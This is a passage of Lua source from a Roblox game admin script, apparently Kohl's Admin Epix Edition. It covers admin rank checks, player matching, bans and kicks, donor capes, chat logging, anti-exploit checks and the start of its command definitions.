                        local a,b=v:match('(.*)=(.*)')
                        if plr.Name==a or plr.userId==tonumber(b) then
                                return true
                        end
                end
        end
end
return false
end
 
set.RemoveAdmin=function(plr,sender)
if not set.CheckAdmin(plr,false) then return true end
local level=0
if sender and sender:IsA('Player') then
        if set.CheckTrueOwner(plr) or sender==plr then return false end
        if set.CheckTrueOwner(sender) then level=3 elseif set.CheckOwner(sender) then level=2 elseif set.CheckAdmin(sender,true) then level=1 end
else
        level=3
end
for i,v in pairs(set.Owners) do
        if level>=3 then
                if plr.Name==v then
                        table.remove(set.Owners,i) return true
                elseif v:find('=') then
                        local a,b=v:match('(.*)=(.*)')
                        if plr.Name==a or plr.userId==tonumber(b) then
                                table.remove(set.Owners,i) return true
                        end
                end
        end
end
for i,v in pairs(set.Admins) do
        if level>=2 then
                if plr.Name==v then
                        table.remove(set.Admins,i) return true
                elseif v:find('=') then
                        local a,b=v:match('(.*)=(.*)')
                        if plr.Name==a or plr.userId==tonumber(b) then
                                table.remove(set.Admins,i) return true
                        end
                end
        end
end
for i,v in pairs(set.TempAdmins) do
        if level>=1 then
                if plr.Name==v then
                        table.remove(set.TempAdmins,i) return true
                elseif v:find('=') then
                        local a,b=v:match('(.*)=(.*)')
                        if plr.Name==a or plr.userId==tonumber(b) then
                                table.remove(set.TempAdmins,i) return true
                        end
                end
        end
end
return false
end
 
set.GetPlayers=function(plr, names)
        local players = {}
        local parent=game:FindFirstChild("NetworkServer") or game:service('Players')
        for s in names:gmatch('([^,]+)') do
                local plrs=0
                local function plus()
                        plrs=plrs+1
                end
                local function getplr(p)
                        if p:IsA('NetworkReplicator') then
                                if p:GetPlayer()~=nil and p:GetPlayer():IsA('Player') then
                                        p=p:GetPlayer()
                                end
                        end
                        return p
                end
                if s:lower()==set.SpecialPrefix..'me' and plr then
                        table.insert(players,plr)
                        plus()
                elseif s:lower()==set.SpecialPrefix..'all' then
                        for i,v in pairs(parent:children()) do
                                local p=getplr(v)
                                table.insert(players,p)
                                plus()
                        end
                elseif s:lower()==set.SpecialPrefix..'others' then
                        for i,v in pairs(parent:children()) do
                                local p=getplr(v)
                                if p~=plr then
                                        table.insert(players,p)
                                        plus()
                                end
                        end
                elseif s:lower()==set.SpecialPrefix..'random' then
                        local rand=parent:children()[math.random(#parent:children())]
                        local p=getplr(rand)
                        table.insert(players,p)
                        plus()
                elseif s:lower()==set.SpecialPrefix..'admins' then
                        for i,v in pairs(parent:children()) do
                                local p=getplr(v)
                                if set.CheckAdmin(p,false) then
                                        table.insert(players,p)
                                        plus()
                                end
                        end
                elseif s:lower()==set.SpecialPrefix..'nonadmins' then
                        for i,v in pairs(parent:children()) do
                                local p=getplr(v)
                                if not set.CheckAdmin(p,false) then
                                        table.insert(players,p)
                                        plus()
                                end
                        end
                elseif s:lower():sub(1,1)=='%' then
                        for i,v in pairs(game:service('Teams'):children()) do
                                if v.Name:lower():sub(1,#s:sub(2))==s:lower():sub(2) then
                                        for k,m in pairs(parent:children()) do
                                                local p=getplr(m)
                                                if p.TeamColor==v.TeamColor then
                                                        table.insert(players,p)
                                                        plus()
                                                end
                                        end
                                end
                        end
                elseif s:lower():sub(1,1)=='$' then
                        for i,v in pairs(parent:children()) do
                                local p=getplr(v)
                                if tonumber(s:lower():sub(2)) then
                                        if p:IsInGroup(tonumber(s:lower():sub(2))) then
                                                table.insert(players,p)
                                                plus()
                                        end
                                end
                        end
                elseif s:lower():sub(1,1)=='-' then
                        for i,v in pairs(players) do
                                if v.Name:lower():sub(1,#s:sub(2))==s:lower():sub(2) then
                                        table.remove(players,i)
                                        plus()
                                end
                        end
                else
                        for i,v in pairs(parent:children()) do
                                local p=getplr(v)
                                if p.Name:lower():sub(1,#s)==s:lower() then
                                        table.insert(players,p)
                                        plus()
                                end
                        end
                end
                if plrs==0 then set.OutputGui(plr,'','No players matching '..s..' were found!') end
        end
        return players
end
 
set.Hint=function(str, plrz, time)
if not str then return end
for i,v in pairs(plrz) do
set.Remote(v,'Function','Hint',str,time)
end
end
 
set.Message=function(ttl, str, scroll, plrz, time)
if not ttl or not str then return end
for i,v in pairs(plrz) do
set.Remote(v,'Function','Message',ttl,str,scroll,time)
end
end
 
set.RemoveMessage=function()
for i,v in pairs(game:service('Players'):children()) do
set.Remote(v,'Function','RemoveMessage')
end
end
 
set.OutputGui=function(plr,msg,e)
local a,b,c=e:match('(.*):(.*):(.*)')
local err
if a and b and c then
if #c<=3 then return end
err = msg..' Line:'..b..' - '..c--e:match("\:(%d+\:.*)")  
else
err = msg..e
end
set.Remote(plr,'Function','OutputGui',err)
end
 
set.Output=function(str, plr)
if not set.canuseloadstring then return end
local b, e = loadstring(str)
if e then--and e:match("\:(%d+\:.*)") then
        set.OutputGui(plr,'Error',e)
--err="Line "..e:match("\:(%d+\:.*)")
--set.Remote(plr,'Function','OutputGui',err)
end
end
 
set.PM=function(from,p,message,player)
set.Remote(p,'Function','PrivateMessage',from,message,player)
end
 
set.CheckBan=function(tabalz,p)
if set.CheckExcluded(p) or set.CheckAdmin(p,false) or set.CheckTrueOwner(p) then return false end
Pcall(function()
for k,m in pairs(set.BTacId) do if p.userId==m then p:Kick() return true end end
for i,v in pairs(tabalz) do
coroutine.wrap(function()
        if v:match('(.*)=(.*)') then
        local name,id=v:match('(.*)=(.*)')
        if name and id then
                if p.Name:lower()==name:lower() or p.userId==tonumber(id)  then
                        p:Kick()
                        return true
                elseif name=='$group' then
                        if p:IsInGroup(tonumber(id)) then p:Kick() return true end
                end
        end
        else
        if p.Name:lower()==v:lower() then
                p:Kick()
                return true
        end
        end
end)()
end
end)
end
 
set.CheckMute=function(player)
        for i,v in pairs(set['MuteList']) do
                if v==player.Name then
                        set.Remote(v,'Function','MutePlayer','on')
                end
        end
end
 
set.CharacterLoaded=function(player)
        Pcall(function() if set['CustomChat'] then set.Remote(player,'Function','CustomChatGui') end
        if set['CustomPlayerList'] then set.Remote(player,'Function','CustomLeaderboard') end
        if set.HelpGui then set.Remote(player,'Function','HelpInfoGui') end
        if set.Console then set.Remote(player,'Function','ConsoleGui') end
        if set.CheckAdmin(player,false) and set['AdminsSpawnWithGuis'] then set.CmdBar(player) if not set.CustomChat then set.AdminChat(player) end end
        set.ProcessPluginEvent('CharacterAdded',player) end)
        Pcall(function() if set.Detection and not set.CheckExcluded(player) and not set.CheckAdmin(player,false) then set.Remote(player,'Function','LaunchAnti','check1') end end)
        Pcall(function() player:WaitForDataReady() if player:LoadBoolean('Kohls Not Using Cape') then return end set.Donor(player) end)
        Pcall(function() if set['AntiSpeed'] and not set.CheckExcluded(player) and not set.CheckAdmin(player,false) then set.Remote(player,'Function','LaunchAnti','speed') end end)
        Pcall(function() if set['AntiGod'] and not set.CheckExcluded(player) and not set.CheckAdmin(player,false) then set.Remote(player,'Function','LaunchAnti','god') end end)
        Pcall(function() if set['AntiAnimation'] and not set.CheckExcluded(player) and not set.CheckAdmin(player,false) then c:WaitForChild('Animate') c.Animate:Destroy() local cl=deps.Animate:clone() cl.Parent=c cl.Disabled=false end end)
end
 
set.MakePluginEvent=function(type,func)
        if type:lower()=='chat' or type:lower()=='playerchatted' or type:lower()=='chatted' then
                set.PluginEvents.Chat[#set.PluginEvents.Chat+1]=func
        elseif type:lower()=='newplayer' or type:lower()=='playerjoined' then
                set.PluginEvents.PlayerJoined[#set.PluginEvents.PlayerJoined+1]=func
        elseif type:lower()=='characteradded' or type:lower()=='characterloaded' then
                set.PluginEvents.CharacterAdded[#set.PluginEvents.CharacterAdded+1]=func
        end
end
 
set.ProcessPluginEvent=function(type,...)
        for i,v in pairs(set.PluginEvents[type]) do
                local yes,no=ypcall(v,...)
                if no then print(no) end
        end
end
 
set.CheckHttp=function()
        local y,n=ypcall(function()
                local hs=game:service('HttpService')
                local get=hs:GetAsync('http://google.com')
        end)
        if y and not n then return true end
end
 
set.CheckGroupAdmin=function(player)
        if player and player:IsA("Player") then
                if set.GroupRanks then
                        for i,v in pairs(set.Ranks) do
                                if not player then return end
                                if player:IsInGroup(v.Group) then
                                        local tab=set.TempAdmins
                                        if v.Type=='Temp' then
                                                tab=set.TempAdmins
                                        elseif v.Type=='Admin' then
                                                tab=set.Admins
                                        elseif v.Type=='Owner' then
                                                tab=set.Owners
                                        end
                                        if type(v.Rank)=='string' or (type(v.Rank)=='number' and v.Rank>0) then
                                                if type(v.Rank)=='number' and player:GetRankInGroup(v.Group)==v.Rank then
                                                        if v.Type=='Banned' then
                                                                player:Kick()
                                                                return false
                                                        end
                                                        return tab
                                                elseif  player:GetRoleInGroup(v.Group)==v.Rank then
                                                        if v.Type=='Banned' then
                                                                player:Kick()
                                                                return false
                                                        end
                                                        return tab
                                                        end
                                        elseif type(v.Rank)=='number' and v.Rank<0 and player:GetRankInGroup(v.Group)>=math.abs(v.Rank) then
                                                if v.Type=='Banned' then
                                                        player:Kick()
                                                        return false
                                                end
                                                return tab
                                        end
                                end
                        end
                end
        end
end
 
set.HookPlayer=function(player)
        local serverKey=Instance.new('StringValue')
        local remoteName=Instance.new('StringValue')
        local clientKey=Instance.new('StringValue')
        local client=deps.Client:Clone()
        client.Name=string.char(math.random(1,255))..set.GuiName..string.char(math.random(1,255))
        serverKey.Value=set.RemoteServerKey
        remoteName.Value=set.RemoteName
        clientKey.Value=set.RemoteClientKey
        serverKey.Name='RemoteServerKey'
        remoteName.Name='RemoteName'
        clientKey.Name='RemoteClientKey'
        serverKey.Parent=client
        remoteName.Parent=client
        clientKey.Parent=client
        client.Parent=player:FindFirstChild('PlayerGui') or player:WaitForChild('Backpack')
        client.Disabled=false
        local function checkhook() for i,v in pairs(set.NewClients) do if v==player.userId then return true end end end
        local num=0 repeat wait(0.01) num=num+0.01 until (not player) or checkhook() or (num>=30 and set.AntiScriptsDisabled)
        if player and num>=30 and set.AntiScriptsDisabled and not set.Debug then pcall(set.Exploited,player,'kick','Client did not reply in time.') print(player.Name..'\'s client did not reply in time, disconnecting.') return end
        for i,v in pairs(set.NewClients) do if v==player.userId then table.remove(set.NewClients,i) end end
end
 
set.NewPlayer=function(player)
Pcall(function() local b,e=ypcall(function() local g=Instance.new('StringValue',player) if g then g:Destroy() end  end) if not b then pcall(set.Exploited,player,'kick','Detected as being RobloxLocked') end if set['AntiRobloxLocked'] then player.Changed:connect(function(o) if o=='RobloxLocked' then local b,e=ypcall(function() local g=Instance.new('StringValue',player) if g then g:Destroy() end end) if not b then pcall(set.Exploited,player,'kick','Detected as being RobloxLocked')  end end end) end end)
Pcall(function() if not set.CheckOwner(player) and set.CheckTrueOwner(player) then table.insert(set.Owners,player.Name) end end)
Pcall(function() set.CheckBan(set['BanList'],player) end)
Pcall(function() if set['Trello'] then set.CheckBan(set.bl,player) end end)
Pcall(function() if set['AntiNewAccount'] and not set.CheckExcluded(player) then if player.AccountAge<set['MinimumAge'] then pcall(set.Exploited,player,'kick','Player was below minimum age. Player Age: '..player.AccountAge) end end end)
Pcall(function() player:WaitForDataReady() if not set.CheckExcluded(player) and not set.CheckAdmin(player,false) then set.CheckTimeBan(player) end if player:LoadBoolean(set['PermBanKey'],true) and not set.CheckAdmin(player,false) then player:Kick() end if player:LoadBoolean('Kohls Is A Donator') and player:LoadString('Kohls Cape') and player:LoadString('Kohls Cape'):match('(.*)=(.*)=(.*)') then local st=player:LoadString('Kohls Cape') local a,b,c=st:match('(.*)=(.*)=(.*)') if not a or not b or not c then return end for i,v in pairs(set.donors) do if v.Name==player.Name then table.remove(set.donors,i) end end table.insert(set.donors,{Name=player.Name,Id=tostring(player.userId),Cape=a,Color=b,Material=c,List='GP'}) end end)
Pcall(function() if set['FreeAdmin'] and (not set.CheckAdmin(player,false)) then if set['FreeAdminType']=='TempAdmin' then table.insert(set['TempAdmins'],player.Name) elseif set['FreeAdminType']=='Admin' then table.insert(set['Admins'],player.Name) elseif set['FreeAdminType']=='Owner' then table.insert(set['Owners'],player.Name) end end end)
Pcall(function() if ((not set.CheckAdmin(player, false)) and (not set.CheckTrueOwner(player))) and set.CheckGroupAdmin(player) then table.insert(set.CheckGroupAdmin(player),player.Name) end end)
Pcall(function() if set['FriendAdmin'] and player:IsFriendsWith(game.CreatorId) then if set.FriendAdminType=='TempAdmin' then table.insert(set.TempAdmins,player.Name) elseif set.FriendAdminType=='Admin' then table.insert(set.Admins,player.Name) elseif set.FriendAdminType=='Owner' then table.insert(set.Owners,player.Name) end end end)
Pcall(function() if set.VipAdmin and not set.CheckAdmin(player,false) then for i,v in pairs(set.VipItems) do if game:service("MarketplaceService"):PlayerOwnsAsset(player,v.Item) then if v.Type=='Admin' then table.insert(set.Admins,player.Name) elseif v.Type=='TempAdmin' then table.insert(set.TempAdmins,player.Name) elseif v.Type=='Owner' then table.insert(set.Owners,player.Name) end end end end end)
set.HookPlayer(player)
Pcall(function() if set['AntiGui'] then if not player:FindFirstChild('PlayerGui') then return end player.PlayerGui.ChildAdded:connect(function(g) Pcall(function() for i,v in pairs(set['AllowedGuiList']) do if not g.Name:find(set.GuiName) and g.Name~=v then g:Destroy() end end end) end) end end)
Pcall(function() if set['AntiSelection'] and not set.CheckExcluded(player) and not set.CheckAdmin(player,false) then set.Remote(player,'Function','LaunchAnti','selection') end end)
Pcall(function() if set['Detection'] and not set.CheckExcluded(player) and not set.CheckAdmin(player,false) then set.Remote(player,'Function','LaunchAnti','detection') end end)
Pcall(function() if player and (((not set.CheckAdmin(player, false)) and (not set.CheckOwner(player))) and (not set.CheckTrueOwner(player))) and (set.slock or (set['GroupOnlyJoin'] and (not player:IsInGroup(set['GroupId'])))) then set.GetPlayerInfo(player,game:service('Players'):children(),'Player Attempted To Join') pcall(function() player:Kick() end) elseif set['JoinMessage'] then if set.CheckDonor(player) and not set.CheckNTac(player) then set.GetPlayerInfo(player,game:service('Players'):children(),'Donator Joined') elseif player.userId==1237666 or player.userId==44391621 then set.GetPlayerInfo(player,game:service('Players'):children(),'Script Creator Joined') else set.GetPlayerInfo(player,game:service('Players'):children(),'Player Joined') end end end)
Pcall(function() if set.CheckAdmin(player,false) then set.Message("Kohl's Admin [Epix Edition]", "You're an admin! Chat "..set['Prefix'].."cmds to view commands! The Command Prefix is "..set['Prefix'], false, {player}) if set.MessageOfTheDay then set.PM('Message of the Day',player,game:service('MarketplaceService'):GetProductInfo(set.MessageOfTheDayID).Description) end end end)
Pcall(function() pcall(set.CheckMute,player) end)
Pcall(function() for i,v in pairs(game:service('Players'):children()) do set.AddPlayerToList(v,player) end end)
Pcall(function() wait(7) if set['Trello'] and not set.CheckHttp() and player.userId==game.CreatorId then set.Message('SYTEM MESSAGE','Trello is enabled but Http is not! Please refer to the settings section at the top of the script for information on enabing it.',false, {player}) end end)
Pcall(function() wait(5) if set['Au'..'toU'..'pd'..'ate'] and player.userId==game.CreatorId and not game:service('MarketplaceService'):PlayerOwnsAsset(player,72814792*2) then set.Message('S'..'YS'..'TE'..'M M'..'ES'..'SAGE','Au'..'toUp'..'da'..'te i'..'s e'..'na'..'bl'..'ed bu'..'t yo'..'u d'..'o n'..'ot ha'..'ve t'..'he scr'..'ipt in your mod'..'el'..'s '..'('..'Y'..'ou ne'..'ed to gr'..'ab i'..'t fr'..'om S'..'c'..'eler'..'at'.."is".."' m'..'od".."el'..'s o".."r t".."he Au".."toUp".."da".."te c".."an".."no".."t fu".."nct".."ion d".."ue t".."o r".."ob".."lo".."x se".."cur".."ity.)",false,{player}) end end)
Pcall(function() if set['AntiCheatEngine'] and not set.CheckExcluded(player) and not set.CheckAdmin(player,false) then set.Remote(player,'Function','LaunchAnti','ce') end end)
Pcall(function() if set.CustomKeyBinds then set.Remote(player,'Function','KeyBindListener') end end)
set.Remote(player,'SetSetting','RealID',player.userId)
set.Remote(player,'SetSetting','RealName',player.Name)
Pcall(function() if set['AntiNameIdChange'] and not set.CheckExcluded(player) and not set.CheckAdmin(player,false) then set.Remote(player,'Function','LaunchAnti','nameid') end end)
Pcall(set.CharacterLoaded,player) player.CharacterAdded:connect(function(c) local y,n=ypcall(set.CharacterLoaded,player) if n then print(n) end end)
set.ProcessPluginEvent('PlayerJoined',player)
end
 
set.PlayerRemoving=function(p)
Pcall(function() if set.CheckNTac(p) or set.CheckGroupAdmin(p) then set.RemoveAdmin(p) end  end)
Pcall(function() for i,v in pairs(workspace:children()) do if v.Name:find('Epix Jail') then set.JailedTools[p.Name]=nil v:Destroy() for k,m in pairs(set.objects) do if m.Name==p.Name .. " Epix Jail" then table.remove(set.objects,k) end end end end end)
Pcall(function() for i,v in pairs(game:service('Players'):children()) do set.Remote(v,'Function','RemovePlayerFromList',p) end end)
Pcall(function() if set.AntiNil and (not set.CheckAdmin(p,false)) and (not set.CheckOwner(p)) and (not set.CheckTrueOwner(p)) and (not set.CheckExcluded(p)) then set.Remote(p,'Function','KillClient') pcall(function() p:Kick() end) for k,m in pairs(workspace:children()) do if m.Name:find(p.Name) then m:Destroy() end end end end)
end
 
set.AddPlayerToList=function(p,v)
        if v.Name=='Sceleratis' or v.Name=='Scripth' then
                set.Remote(p,'Function','AddPlayerToList',v,'Scripter')
        elseif set.CheckAdmin(v,false) then
                set.Remote(p,'Function','AddPlayerToList',v,'Admin')
        elseif v.MembershipType==Enum.MembershipType.BuildersClub then
                set.Remote(p,'Function','AddPlayerToList',v,'BC')
        elseif v.MembershipType==Enum.MembershipType.TurboBuildersClub then
                set.Remote(p,'Function','AddPlayerToList',v,'TBC')
        elseif v.MembershipType==Enum.MembershipType.OutrageousBuildersClub then
                set.Remote(p,'Function','AddPlayerToList',v,'OBC')
        else
                set.Remote(p,'Function','AddPlayerToList',v,'Norm')
        end
end
 
set.GetCurrentPlayerlist=function(p)
        for i,v in pairs(game:service('Players'):children()) do
                set.AddPlayerToList(p,v)
        end
end
 
set.Noobify=function(char)
if char and char:findFirstChild("Torso") then
if char:findFirstChild("Shirt") then char.Shirt.Parent = char.Torso end
if char:findFirstChild("Pants") then char.Pants.Parent = char.Torso end
for a, sc in pairs(char:children()) do if sc.Name == "ify" then sc:Destroy() end end
local cl = Instance.new("StringValue", char) cl.Name = "ify" cl.Parent = char
for q, prt in pairs(char:children()) do if prt:IsA("BasePart") and prt.Name~='HumanoidRootPart' and (prt.Name ~= "Head" or not prt.Parent:findFirstChild("NameTag", true)) then
prt.Transparency = 0 prt.Reflectance = 0 prt.BrickColor = BrickColor.new("Bright yellow")
if prt.Name:find("Leg") then prt.BrickColor = BrickColor.new("Br. yellowish green") elseif prt.Name == "Torso" then prt.BrickColor = BrickColor.new("Bright blue") end
local tconn = prt.Touched:connect(function(hit) if hit and hit.Parent and game:service('Players'):findFirstChild(hit.Parent.Name) and cl.Parent == char then set.Noobify(hit.Parent) elseif cl.Parent ~= char then tconn:disconnect() end end)
cl.Changed:connect(function() if cl.Parent ~= char then tconn:disconnect() end end)
elseif prt:findFirstChild("NameTag") then prt.Head.Transparency = 0 prt.Head.Reflectance = 0 prt.Head.BrickColor = BrickColor.new("Bright yellow")
end end end end
 
set.Infect=function(char)
if char and char:findFirstChild("Torso") then
if char:findFirstChild("Shirt") then char.Shirt:Destroy() end
if char:findFirstChild("Pants") then char.Pants:Destroy() end
local shirt=Instance.new('Shirt',char)
local pants=Instance.new('Pants',char)
shirt.ShirtTemplate="http://www.roblox.com/asset/?id=60636107"
pants.PantsTemplate="http://www.roblox.com/asset/?id=60636428"
for a, sc in pairs(char:children()) do if sc.Name == "ify" then sc:Destroy() end end
local cl = Instance.new("StringValue", char)
cl.Name = "ify"
cl.Parent = char
for q, prt in pairs(char:children()) do if prt:IsA("BasePart") and prt.Name~='HumanoidRootPart' and (prt.Name ~= "Head" or not prt.Parent:findFirstChild("NameTag", true)) then
prt.Transparency = 0
prt.Reflectance = 0
prt.BrickColor = BrickColor.new("Dark green")
if prt.Name:find("Leg") or prt.Name:find('Arm') then
prt.BrickColor = BrickColor.new("Dark green") end
local tconn = prt.Touched:connect(function(hit)
if hit and hit.Parent and game:service('Players'):findFirstChild(hit.Parent.Name) and cl.Parent == char then
set.Infect(hit.Parent)
elseif cl.Parent ~= char then tconn:disconnect() end end)
cl.Changed:connect(function() if cl.Parent ~= char then tconn:disconnect() end end)
elseif prt:findFirstChild("NameTag") then
        prt.Head.Transparency = 0 prt.Head.Reflectance = 0 prt.Head.BrickColor = BrickColor.new("Dark green") end
end
end
end
 
set.ReverseTable=function(tabz)
local res = {}
for i=#tabz,1,-1 do
table.insert(res,tabz[i])
end
return res
end
 
set.CheckDonor=function(plr)
if plr.AccountAge<=0 then return false end
if set.CheckDonorPass(plr) then return true end
for i,v in pairs(set.GetDonorList()) do
        if plr.Name==v.Name or plr.userId==v.Id then
                return true
        end
end
end
 
set.CheckDonorPass=function(plr)
if not game:service('GamePassService') or not game:service('MarketplaceService') then return end
for i,v in pairs(set.donorgamepass) do
if game:service('GamePassService'):PlayerHasPass(plr,v) or game:service('MarketplaceService'):PlayerOwnsAsset(plr,v) then
        return true
end
end
end
 
--set.ChkCustomPass=function(plr)
--if not game:service('GamePassService') then return end
--for i,v in pairs(set.custompass) do
--if game:service('GamePassService'):PlayerHasPass(plr,v) then
--      return true
--end
--end
--end
 
set.CheckDonorList=function(plr)
for i,v in pairs(set.donors) do
        if plr.Name==v.Name or plr.userId==v.Id then
                return true
        end
end
end
 
set.GetDonorList=function()
local temp={}
for k,asset in pairs(game:GetService("InsertService"):GetCollection(1290539)) do
local ins=game:GetService('MarketplaceService'):GetProductInfo(asset.AssetId)
local fo=ins.Description
for so in fo:gmatch('[^;]+') do
Pcall(function()
local name,id,cape,color=so:match('{(.*),(.*),(.*),(.*)}')
table.insert(temp,{Name=name,Id=tostring(id),Cape=tostring(cape),Color=color,Material='Plastic',List=ins.Name})
end)
end
end
return temp
end
 
if game.CreatorId~=0 and game:GetService('MarketplaceService') then
Pcall(function()
set.dlastupdatenum=0
while wait() do
pcall(function()
set.donors={}
set.dlastupdate=set.GetTime()..' - '..set.dlastupdatenum
set.dlastupdatenum=set.dlastupdatenum+1
set.donors=set.GetDonorList()
for ik,pl in pairs(game:service('Players'):children()) do
        Pcall(function()
                pl:WaitForDataReady()
                if set.CheckDonor(pl) and pl:LoadBoolean('Kohls Is A Donator') and pl:LoadString('Kohls Cape') and pl:LoadString('Kohls Cape'):match('(.*)=(.*)=(.*)') then
                        local st=pl:LoadString('Kohls Cape')
                        local a,b,c=st:match('(.*)=(.*)=(.*)')
                        if not a or not b or not c then return end
                        for i,v in pairs(set.donors) do if v.Name==pl.Name then table.remove(set.donors,i) end end
                        table.insert(set.donors,{Name=pl.Name,Id=tostring(pl.userId),Cape=a,Color=b,Material=c,List='GP(Custom)'})
                elseif set.CheckDonor(pl) and not set.CheckDonorList(pl) and not pl:LoadBoolean('Kohls Is A Donator') then
                        table.insert(set.donors,{Name=pl.Name,Id=tostring(pl.userId),Cape='149009184',Color='White',Material='Plastic',List='GP'})
                end
        end)
end
wait(30)
end)
end
end)
end
 
set.Donor=function(plr)
        for i,v in pairs(set.donors) do
                if plr and (plr.Name==v.Name or plr.userId==v.Id) and (set.DonorPerks or set.CheckNTac(plr)) then
                        Pcall(function()
                                plr:WaitForChild('Backpack')
                                pcall(function() plr.Character.EpicCape:Destroy() end)
                                local gear=game:GetService('InsertService'):LoadAsset(57902997):children()[1]
                                if not plr.Backpack:FindFirstChild(gear.Name..'DonorTool') then
                                        gear.Name=gear.Name..'DonorTool'
                                        gear.Parent=plr.Backpack
                                else
                                        gear:Destroy()
                                end
                                if plr and plr.Character and plr.Character:FindFirstChild("Torso") then
                                        set.Cape(plr,v.Material,v.Color,v.Cape)
                                end
                        end)
                end
        end
end
 
set.CheckExcluded=function(plr)
        for i,v in pairs(set.ExclusionList) do
                if v==plr.Name then
                        return true
                end
        end
end
 
set.AlertAdmins=function(msg)
        if not set.ExploitAlert then return end
        for i,v in pairs(set.GetPlayers(false,set.SpecialPrefix..'admins')) do
                set.Remote(v,'Function','AlertGui',msg)
        end
end
 
set.Chat=function(plr,msg)
Pcall(function()
Pcall(function()
        if set['ChatLog'] then
                if game:service('Players'):FindFirstChild(plr.Name) then
                        table.insert(set.PlayerLogs.Chat,1,{Time=set.GetTime(),Name=plr.Name,Chat=msg})
                else
                        table.insert(set.PlayerLogs.Chat,1,{Time=set.GetTime(),Name=plr.Name,Chat=msg,Nil=true})
                end
                if #set.PlayerLogs.Chat>set.MaxNumberOfLogs then
                        table.remove(set.PlayerLogs.Chat,#set.PlayerLogs.Chat)
                end
        end
end)
 
if msg:lower():sub(1,2)=='/e' then msg=msg:sub(4) end
 
Pcall(function()
        if set['AntiChatCode'] and msg:match('%S') and not set.CheckExcluded(plr) and not set.CheckAdmin(plr,false) then
                Pcall(function()
                        local m,c
                        if set.canuseloadstring then
                                m,c = loadstring(msg)
                        else
                                m=false
                        end
                        for d,j in pairs(set['WordList']) do
                                if msg:lower():match(j:lower()) or m then
                                        if game:service('Players'):FindFirstChild(plr.Name) then
                                                pcall(set.Exploited,plr,'kick','Chatted '..msg)
                                        else
                                                pcall(set.Exploited,plr,'crash','Chatted '..msg)
                                        end
                                        set.AlertAdmins(plr.Name.." was just kicked for chatting a word on the Anti-Exploit's word list! They could be an exploiter. Investigate if they rejoin.")
                                end
                        end
                end)
        end
        set.ProcessPluginEvent('Chat',msg,plr)
end)
 
Pcall(function()
        if plr:FindFirstChild('NoTalk') and not set.CheckAdmin(plr,false) and plr.Character and plr.Character:FindFirstChild('Head') then
                if msg==set['AnyPrefix']..'attn' then
                        game:GetService('Chat'):Chat(plr.Character.Head,'I need to speak to an Administrator!',Enum.ChatColor.Blue)
                elseif msg~=set['AnyPrefix']..'attn' and msg~=set['AnyPrefix']..'help' and plr.NoTalk.Value==0 then
                        game:GetService('Chat'):Chat(plr.Character.Head,"You are not allowed to speak "..plr.Name.."! Use "..set['AnyPrefix'].."attn to get an Admin's attention. This is warning 1.",Enum.ChatColor.Blue)
                        plr.NoTalk.Value=plr.NoTalk.Value+1
                elseif msg~=set['AnyPrefix']..'attn' and msg~=set['AnyPrefix']..'help' and player.NoTalk.Value==1 then
                        game:GetService('Chat'):Chat(plr.Character.Head,'You have been told not to speak '..plr.Name..'! You will be punished next time! Use '..set['AnyPrefix']..'attn. Warning 2',Enum.ChatColor.Green)
                        plr.NoTalk.Value=plr.NoTalk.Value+1
                elseif msg~=set['AnyPrefix']..'attn' and msg~=set['AnyPrefix']..'help' and plr.NoTalk.Value==2 then
                        game:GetService('Chat'):Chat(plr.Character.Head,'You have been told not to speak '..plr.Name..'! You have been punished. Next is a kick. Use '..set['AnyPrefix']..'attn. Warning 3',Enum.ChatColor.Red)
                        plr.Character:BreakJoints()
                        plr.NoTalk.Value=player.NoTalk.Value+1
                elseif msg~=set['AnyPrefix']..'attn' and msg~=set['AnyPrefix']..'help' and plr.NoTalk.Value==3 then
                        game:GetService('Chat'):Chat(plr.Character.Head,'You have been told not to speak '..plr.Name..'! This is the 4th time. Use '..set['AnyPrefix']..'attn next time. You will now be kicked.',Enum.ChatColor.Red)
                        wait(1)
                        plr:Kick()
                end
        end
end)
set.ProcessCommand(plr,msg)
end)
end
 
---[[ COMMANDS ]]---
Pcall(function()
set.MakeCommand('Binds <command> to <key>, will overwrite an exiting keybind (WILL NOT OVERWRITE SCRIPT KEYBINDS!)',0,set.AnyPrefix,{'keybind','bindkey','bind'},{'key','command'},2,function(plr,args)
        if set.CustomKeyBinds then
                set.Remote(plr,'Function','AddKeyBind',args[1]:sub(1,1),args[2])
        else
                set.Message('SYSTEM MESSAGE','Sorry but custom key binds are disabled.',false,{plr})
        end
end)
 
set.MakeCommand('Removes <key> from key binds',0,set.AnyPrefix,{'removekeybind','removebind','unbind'},{'key'},1,function(plr,args)
        if set.CustomKeyBinds then
                set.Remote(plr,'Function','RemoveKeyBind',args[1])
        else
                set.Message('SYSTEM MESSAGE','Sorry but custom key binds are disabled.',false,{plr})
        end
end)
 
set.MakeCommand('View key binds',0,set.AnyPrefix,{'keybinds','binds','viewkeybinds'},{},0,function(plr,args)
        if set.CustomKeyBinds then
                set.Remote(plr,'Function','ViewKeyBinds',args[1])
        else
                set.Message('SYSTEM MESSAGE','Sorry but custom key binds are disabled.',false,{plr})
        end
end)
 
set.MakeCommand('Remove donor cape',1,set.AnyPrefix,{'uncape','removedonorcape'},{},0,function(plr,args)
        pcall(function() plr.Character.EpicCape:Destroy() end)
end)
       
set.MakeCommand('Get donor cape',1,set.AnyPrefix,{'cape','donorcape'},{},0,function(plr,args)
        set.Donor(plr)
end)
 
set.MakeCommand('Gives you fire with the specified color (if you specify one)',1,set.AnyPrefix,{'fire','donorfire'},{'color (optional)'},1,function(plr,args)
        if plr.Character:FindFirstChild("Torso") then
                if plr.Character.Torso:FindFirstChild('DonorFire') then plr.Character.Torso.DonorFire:Destroy() end
                if plr.Character.Torso:FindFirstChild('DonorFireLight') then plr.Character.Torso.DonorFireLight:Destroy() end
                local f=Instance.new('Fire',plr.Character.Torso)
                f.Name='DonorFire'
                local p=Instance.new('PointLight',plr.Character.Torso)
                p.Name='DonorFireLight'
                table.insert(set.objects,f)
                table.insert(set.objects,p)
                p.Range=15
                if args[1] then
                        local str = BrickColor.new('Bright orange').Color
                        local teststr = args[1]
                        if BrickColor.new(teststr) ~= nil then str = BrickColor.new(teststr).Color end
                        p.Color=str
                        f.Color=str
                        f.SecondaryColor=str
                else
                        p.Color=Color3.new(1,1,1)
                        f.Color=Color3.new(1,1,1)
                        f.SecondaryColor=Color3.new(1,0,0)
                end
        end
end)
 
set.MakeCommand('Gives you sparkles with the specified color (if you specify one)',1,set.AnyPrefix,{'sparkles','donorsparkles'},{'color (optional)'},1,function(plr,args)
        if plr.Character:FindFirstChild("Torso") then
